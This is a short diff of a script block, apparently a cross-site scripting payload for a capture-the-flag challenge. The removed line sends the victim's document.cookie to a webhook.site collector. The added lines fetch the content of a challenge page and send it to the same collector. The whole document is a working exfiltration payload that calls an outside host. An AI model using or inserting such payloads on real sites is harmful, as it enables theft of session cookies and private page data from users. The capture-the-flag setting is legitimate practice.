@@ -1,3 +1,5 @@
 <script>
-    window.location=`https://webhook.site/ada87e9c-ad1d-471b-960e-0e0dcd8b75ac/?flag=${document.cookie}`
+    fetch('https://gimmecsp.asisctf.com').then(r => r.text()).then(r => {
+        fetch(`https://webhook.site/ada87e9c-ad1d-471b-960e-0e0dcd8b75ac/?flag=${r}`)
+    });
 </script>
